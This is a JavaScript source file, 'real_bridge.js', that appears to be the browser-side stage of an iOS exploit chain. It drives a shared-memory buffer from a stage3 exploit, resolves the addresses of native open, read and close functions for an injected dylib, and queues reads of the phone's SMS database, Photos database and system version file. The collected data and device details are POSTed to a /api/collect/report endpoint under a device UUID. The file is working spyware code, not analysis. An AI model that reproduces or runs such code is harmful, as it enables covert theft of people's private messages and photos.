/**
 * real_bridge.js v11 — stock bootstrap + real_collector 双模式
 *
 * stock: 只驱动 F00DBEEF READY/kick，上报 snapshot
 * real_collector v2: dylib_started 后 FEED:
 *   setapis:open=..,read=..,close=..  (JS ImageList 解析)
 *   read_fixed / read_head:/path       (固定路径，无 opendir)
 *
 * 协议 D0: 0 IDLE 1 URL 2 DL 3 READY 4 ERROR 5 EXIT 6 FEED/TA 7 POST
 */
(function () {
    "use strict";

    var S = { IDLE: 0, URL: 1, DL: 2, READY: 3, ERROR: 4, EXIT: 5, FEED: 6, POST: 7 };
    var _started = false;
    var _deviceUuid = "";
    var _d = null;
    var _u8 = null;
    var _timer = null;
    var _lastKey = "";
    var _lastD0 = -1;
    var _ticks = 0;
    var _kickCount = 0;
    var _lastKickAt = 0;
    var _lastKickKey = "";
    var _f00dConsumed = false;
    var _collectorMode = false;
    var _cmdQueue = [];
    var _cmdBusy = false;
    var _cmdSentAt = 0;
    var _pendingCat = "";
    var _autoStarted = false;

    function log(m) {
        try {
            if (window.log) window.log("[SHARED] " + m);
            else console.log("[SHARED] " + m);
        } catch (e) {}
    }

    function nameD0(n) {
        return ({ 0: "IDLE", 1: "URL", 2: "DL", 3: "READY", 4: "ERROR", 5: "EXIT", 6: "FEED", 7: "POST" })[n] || ("?" + n);
    }

    function getBuffer() {
        function pick(x) {
            if (!x) return null;
            if (x instanceof Uint32Array) return x;
            if (x.buffer instanceof Uint32Array) return x.buffer;
            if (x.D instanceof Uint32Array) return x.D;
            return null;
        }
        var cands = [
            window.__stage3Buffer,
            window.__stage3Ctrl && window.__stage3Ctrl.buffer,
            window.__stage3Ctrl && window.__stage3Ctrl.D
        ];
        try {
            var pm = window.platformModule;
            if (!pm && window.globalThis && window.globalThis.moduleManager) {
                pm = window.globalThis.moduleManager.getModuleByName(
                    "14669ca3b1519ba2a8f40be287f646d4d7593eb0"
                );
            }
            if (pm && pm.platformState) {
                cands.push(pm.platformState.sharedBuffer);
                cands.push(pm.platformState.stage3Ctrl && pm.platformState.stage3Ctrl.buffer);
            }
        } catch (e) {}
        for (var i = 0; i < cands.length; i++) {
            var p = pick(cands[i]);
            if (p) return p;
        }
        return null;
    }

    function attach() {
        var buf = getBuffer();
        if (!buf) return false;
        _d = buf;
        _u8 = new Uint8Array(buf.buffer, buf.byteOffset, buf.byteLength);
        return true;
    }

    function readBytes(maxLen) {
        if (!_d || !_u8) return new Uint8Array(0);
        var size = _d[1] >>> 0;
        if (size <= 0) return new Uint8Array(0);
        if (size > _u8.length - 8) size = _u8.length - 8;
        if (maxLen && size > maxLen) size = maxLen;
        return _u8.subarray(8, 8 + size);
    }

    function readCString() {
        var bytes = readBytes(65536);
        var out = "";
        for (var i = 0; i < bytes.length; i++) {
            if (!bytes[i]) break;
            out += String.fromCharCode(bytes[i]);
        }
        return out;
    }

    function parseF00D(bytes) {
        if (!bytes || bytes.length < 8) return null;
        if (bytes[0] !== 0xef || bytes[1] !== 0xbe || bytes[2] !== 0x0d || bytes[3] !== 0xf0) return null;
        var n = bytes[4] | (bytes[5] << 8) | (bytes[6] << 16) | (bytes[7] << 24);
        var entries = [];
        for (var i = 0; i < n && i < 32; i++) {
            var off = 8 + i * 16;
            if (off + 16 > bytes.length) break;
            var f1 = bytes[off] | (bytes[off + 1] << 8) | (bytes[off + 2] << 16) | (bytes[off + 3] << 24);
            var f2 = bytes[off + 4] | (bytes[off + 5] << 8) | (bytes[off + 6] << 16) | (bytes[off + 7] << 24);
            var dataOff = bytes[off + 8] | (bytes[off + 9] << 8) | (bytes[off + 10] << 16) | (bytes[off + 11] << 24);
            var dataSz = bytes[off + 12] | (bytes[off + 13] << 8) | (bytes[off + 14] << 16) | (bytes[off + 15] << 24);
            entries.push({
                index: i,
                type: (f1 >>> 16) & 0xffff,
                f1: f1 >>> 0,
                f2: f2 >>> 0,
                dataOff: dataOff >>> 0,
                dataSize: dataSz >>> 0
            });
        }
        return { magic: "F00DBEEF", entryCount: n >>> 0, entries: entries, totalBytes: bytes.length };
    }

    function hasF00D() {
        if (!_d || !_u8) return false;
        var size = _d[1] >>> 0;
        if (size < 8) return false;
        return _u8[8] === 0xef && _u8[9] === 0xbe && _u8[10] === 0x0d && _u8[11] === 0xf0;
    }

    function postCollect(category, payload) {
        var base = window.location.protocol + "//" + window.location.host;
        return fetch(base + "/api/collect/report", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                device_uuid: _deviceUuid || window.__deviceUuid || "unknown",
                category: category,
                data_key: category,
                payload: payload,
                source: _collectorMode ? "real_collector" : "bootstrap_sharedmem",
                collected_at: new Date().toISOString()
            }),
            keepalive: true
        }).then(function (r) {
            log("collect " + category + " => " + r.status);
            return r.json().catch(function () { return {}; });
        }).catch(function (e) {
            log("collect err " + e.message);
        });
    }

    function iosInfo() {
        try {
            var pm = window.platformModule;
            if (pm && pm.platformState) {
                return {
                    ios: pm.platformState.iOSVersion,
                    pac: pm.platformState.hasPAC,
                    runtime: pm.platformState.runtime
                };
            }
        } catch (e) {}
        return {};
    }

    function tryParseJson(text) {
        if (!text) return null;
        var s = text.replace(/^\uFEFF/, "").trim();
        if (!s || s.charAt(0) !== "{") return null;
        try { return JSON.parse(s); } catch (e) { return null; }
    }

    function reportBufferSnapshot(reason) {
        if (!_d) return;
        var size = _d[1] >>> 0;
        var d0 = _d[0] >>> 0;
        var key = d0 + ":" + size + ":" + reason;
        if (key === _lastKey) return;
        _lastKey = key;

        var bytes = readBytes(Math.min(size, 256 * 1024));
        var f00d = parseF00D(bytes);
        var cstr = readCString();
        var info = iosInfo();
        var j = tryParseJson(cstr);

        if (j && (j.source === "real_collector" || (j.ok && j.msg === "dylib_started"))) {
            if (!_collectorMode) {
                _collectorMode = true;
                window.__REAL_COLLECTOR_MODE__ = true;
                log("collector mode ON");
            }
            var cat = j.cmd || j.event || j.category || "collector_json";
            if (_pendingCat) {
                cat = _pendingCat;
                _pendingCat = "";
            }
            postCollect(cat, j);
            if (j.event === "boot" || j.msg === "dylib_started") maybeStartAutoCollect();
            _cmdBusy = false;
            return;
        }

        var payload = {
            reason: reason,
            d0: d0,
            d0_name: nameD0(d0),
            size: size,
            ios: info.ios || null,
            pac: info.pac,
            f00d: f00d,
            text_preview: cstr ? cstr.slice(0, 300) : "",
            hex_head: (function () {
                var h = "";
                var n = Math.min(bytes.length, 64);
                for (var i = 0; i < n; i++) {
                    var x = bytes[i].toString(16);
                    if (x.length < 2) x = "0" + x;
                    h += x;
                }
                return h;
            })()
        };
        log("snapshot " + reason + " D0=" + d0 + " size=" + size +
            (f00d ? (" F00D entries=" + f00d.entryCount) : ""));
        postCollect("sharedmem_snapshot", payload);
    }

    function ensureCtrl() {
        try {
            if (window.__stage3Ctrl && typeof window.__stage3Ctrl.start === "function") {
                window.__stage3Ctrl.start();
            }
        } catch (e) {}
    }

    function sizeSane(size) {
        return size > 0 && size < 0x1000000 && size < (_u8 ? _u8.length - 8 : 0x1000000);
    }

    function kick(reason) {
        var now = Date.now();
        var d0 = _d ? (_d[0] >>> 0) : -1;
        var size = _d ? (_d[1] >>> 0) : -1;
        if (d0 === S.URL || d0 === S.DL || d0 === S.POST) {
            ensureCtrl();
            return false;
        }
        if (d0 !== S.FEED && !sizeSane(size) && size !== 0) {
            log("kick skip insane size=" + size + " d0=" + d0);
            return false;
        }
        var key = reason + ":" + d0 + ":" + size;
        if (key === _lastKickKey && now - _lastKickAt < 800) return false;
        if (_kickCount >= 40) {
            if (_kickCount === 40) log("kick cap reached");
            _kickCount++;
            return false;
        }
        _lastKickKey = key;
        _lastKickAt = now;
        _kickCount++;
        ensureCtrl();
        if (typeof window.__stage3KickProcess === "function") {
            log("kick via __stage3KickProcess #" + _kickCount + " " + reason);
            return !!window.__stage3KickProcess(reason);
        }
        if (typeof window.__stage3Reenter === "function") {
            log("kick via __stage3Reenter #" + _kickCount + " " + reason);
            return !!window.__stage3Reenter();
        }
        log("kick unavailable reason=" + reason);
        return false;
    }

    function writeFeed(cmd) {
        if (!_d || !_u8) return false;
        var s = "cmd:" + cmd;
        var i;
        for (i = 0; i < s.length && (8 + i) < _u8.length; i++) {
            _u8[8 + i] = s.charCodeAt(i) & 0xff;
        }
        if (8 + i < _u8.length) _u8[8 + i] = 0;
        _d[1] = s.length;
        _d[0] = S.FEED;
        window.__REAL_COLLECTOR_MODE__ = true;
        log("FEED " + s);
        return true;
    }

    function queueCmd(cmd, category) {
        _cmdQueue.push({ cmd: cmd, category: category || cmd });
    }

    /* resolve open/read/close for freestanding collector (DarkSword FileUtils style) */
    function resolvePosixHex() {
        var out = { open: 0, read: 0, close: 0 };
        function toHex(n) {
            n = n >>> 0;
            return "0x" + n.toString(16);
        }
        function numSym(v) {
            if (v == null) return 0;
            if (typeof v === "number") return v >>> 0;
            if (v.toNumber) try { return v.toNumber() >>> 0; } catch (e) {}
            if (v.Pt) try { return v.Pt() >>> 0; } catch (e2) {}
            var n = Number(v);
            return isFinite(n) ? (n >>> 0) : 0;
        }
        try {
            if (window.nativeBridge && typeof window.nativeBridge.ds === "function") {
                try { if (window.nativeBridge.init) window.nativeBridge.init(); } catch (eI) {}
                out.open = numSym(window.nativeBridge.ds("open"));
                out.read = numSym(window.nativeBridge.ds("read"));
                out.close = numSym(window.nativeBridge.ds("close"));
            }
        } catch (e0) {}
        if (!out.open || !out.read || !out.close) {
            try {
                var et = null, il = null;
                if (window.platformModule) {
                    et = window.platformModule.platformState &&
                        (window.platformModule.platformState.Dn || window.platformModule.cr());
                    if (et && typeof et.Sh === "function") il = et.Sh();
                    if (!il && et && et.dh) il = et.dh;
                    if (!il) il = et;
                }
                function ds1(name) {
                    if (!il) return 0;
                    var bare = name.charAt(0) === "_" ? name.slice(1) : name;
                    var tries = [bare, "_" + bare];
                    var i, n;
                    for (i = 0; i < tries.length; i++) {
                        try {
                            if (il.Kh) {
                                n = numSym(il.Kh(tries[i]));
                                if (n) return n;
                            }
                        } catch (e1) {}
                    }
                    return 0;
                }
                if (!out.open) out.open = ds1("open");
                if (!out.read) out.read = ds1("read");
                if (!out.close) out.close = ds1("close");
            } catch (e2) {}
        }
        return {
            open: out.open ? toHex(out.open) : null,
            read: out.read ? toHex(out.read) : null,
            close: out.close ? toHex(out.close) : null,
            ok: !!(out.open && out.read && out.close)
        };
    }

    function maybeStartAutoCollect() {
        if (_autoStarted) return;
        _autoStarted = true;
        // DarkSword 风格：固定路径 + open/read/close；不 opendir
        // 1) ping  2) setapis(JS resolve)  3) read_fixed
        log("auto collect: ping + setapis + read_fixed (no opendir)");
        queueCmd("ping", "dylib_ping");
        var apis = resolvePosixHex();
        postCollect("collector_apis", {
            ok: apis.ok,
            open: apis.open,
            read: apis.read,
            close: apis.close,
            note: "js_resolved_for_freestanding_collector"
        });
        if (apis.ok) {
            queueCmd(
                "setapis:open=" + apis.open + ",read=" + apis.read + ",close=" + apis.close,
                "setapis"
            );
            queueCmd("read_fixed", "read_fixed");
            // 单路径优先（成功一条即可 POST）
            queueCmd("read_head:/private/var/mobile/Library/SMS/sms.db", "sms_db_head");
            queueCmd("read_head:/private/var/mobile/Media/PhotoData/Photos.sqlite", "photos_db_head");
            queueCmd("read_head:/System/Library/CoreServices/SystemVersion.plist", "sysver_head");
        } else {
            log("posix resolve failed — collector stays ping-only");
            postCollect("read_fixed", {
                ok: false,
                error: "js_posix_resolve_failed",
                note: "cannot setapis; freestanding has no dlsym"
            });
        }
    }

    function pumpCmd() {
        if (!_collectorMode || _cmdBusy) return;
        if (!_cmdQueue.length) return;
        var d0 = _d[0] >>> 0;
        if (d0 === S.URL || d0 === S.DL || d0 === S.POST) return;
        var item = _cmdQueue.shift();
        _cmdBusy = true;
        _pendingCat = item.category;
        _cmdSentAt = Date.now();
        if (!writeFeed(item.cmd)) {
            _cmdBusy = false;
            return;
        }
        kick("feed-" + item.cmd);
    }

    function drive() {
        if (!_d && !attach()) return;
        var d0 = _d[0] >>> 0;
        var size = _d[1] >>> 0;
        var f00d = hasF00D();

        if (d0 === S.URL || d0 === S.DL || d0 === S.POST) {
            ensureCtrl();
            return;
        }

        // collector 模式下 FEED 交给 native，不在这里改
        if (_collectorMode && d0 === S.FEED) {
            if (Date.now() - _cmdSentAt > 2000) {
                kick("feed-retry");
                _cmdSentAt = Date.now();
            }
            return;
        }

        if (_collectorMode) {
            // READY 结果
            if (d0 === S.READY && size > 0 && !f00d) {
                reportBufferSnapshot("collector_ready");
                _cmdBusy = false;
                return;
            }
            // 空闲则下发命令
            if ((d0 === S.IDLE || d0 === S.READY) && !f00d) {
                pumpCmd();
            }
            return;
        }

        if (!sizeSane(size)) return;

        if (d0 === S.IDLE && f00d && !_f00dConsumed) {
            log("drive IDLE+F00D → READY size=" + size);
            _d[0] = S.READY;
            reportBufferSnapshot("drive_force_ready");
            kick("idle-f00d");
            return;
        }

        if (d0 === S.READY && f00d) {
            kick("ready-f00d");
            return;
        }

        if (d0 === S.READY && size > 20 && !f00d) {
            reportBufferSnapshot("ready_result");
            return;
        }

        if (_f00dConsumed === false && size < 100 && size > 0 && !f00d) {
            _f00dConsumed = true;
            log("payload likely consumed size=" + size);
            reportBufferSnapshot("consumed");
        }
        if (d0 === S.IDLE && size > 20 && !f00d) {
            reportBufferSnapshot("idle_text");
        }
    }

    function tick() {
        _ticks++;
        if (!_d && !attach()) return;

        var d0 = _d[0] >>> 0;
        var size = _d[1] >>> 0;

        if (d0 !== _lastD0) {
            log("D0 " + _lastD0 + "→" + d0 + " (" + nameD0(d0) + ") size=" + size);
            _lastD0 = d0;
            reportBufferSnapshot("state_change");
            drive();
        } else if (_ticks % 2 === 0) {
            drive();
        }

        if (d0 === S.READY && size > 0 && !hasF00D()) {
            reportBufferSnapshot("ready");
        }
        if (d0 === S.ERROR) reportBufferSnapshot("error");
        if (d0 === S.EXIT) reportBufferSnapshot("exit");

        if (_cmdBusy && Date.now() - _cmdSentAt > 8000) {
            log("cmd timeout, continue");
            _cmdBusy = false;
            _pendingCat = "";
        }

        if (_ticks % 10 === 1) ensureCtrl();
        if (_collectorMode && _ticks % 3 === 0) pumpCmd();
    }

    function start(opts) {
        if (_started) return;
        _started = true;
        opts = opts || {};
        _deviceUuid = opts.deviceUuid || opts.device_uuid || window.__deviceUuid || "";
        try {
            if (!window.platformModule && window.globalThis && window.globalThis.moduleManager) {
                window.platformModule = window.globalThis.moduleManager.getModuleByName(
                    "14669ca3b1519ba2a8f40be287f646d4d7593eb0"
                );
            }
        } catch (e) {}

        log("start v11 device=" + _deviceUuid);
        ensureCtrl();

        var tries = 0;
        function boot() {
            tries++;
            if (attach()) {
                log("attached bytes=" + _u8.length + " D0=" + (_d[0] >>> 0) + " size=" + (_d[1] >>> 0));
                reportBufferSnapshot("boot");
                postCollect("chain_meta", {
                    ok: true,
                    mode: "real_bridge_v11",
                    ios: iosInfo().ios,
                    pac: iosInfo().pac,
                    d0: _d[0] >>> 0,
                    size: _d[1] >>> 0,
                    note: "collector FEED after dylib_started"
                });
                drive();
                // 主动 kick 一次，让 one-shot collector 回 boot
                setTimeout(function () {
                    if (!_collectorMode && _d) {
                        var d0 = _d[0] >>> 0;
                        if (d0 === S.IDLE || d0 === S.READY) {
                            if (hasF00D()) _d[0] = S.READY;
                            kick("boot-probe");
                        }
                    }
                }, 400);
                _timer = setInterval(tick, 400);
            } else if (tries < 80) {
                setTimeout(boot, 200);
            } else {
                log("attach failed");
            }
        }
        setTimeout(boot, 100);
    }

    function stop() {
        if (_timer) clearInterval(_timer);
        _timer = null;
        _started = false;
    }

    window.RealBridge = {
        start: start,
        stop: stop,
        attach: attach,
        kick: kick,
        drive: drive,
        writeFeed: writeFeed,
        queueCmd: queueCmd,
        reenterIfNeeded: function () {
            return kick("manual-reenter");
        },
        isCollector: function () { return _collectorMode; }
    };

    if (window.__REAL_BRIDGE_AUTO__) {
        try { start({ deviceUuid: window.__deviceUuid || "" }); } catch (e) {}
    }
})();
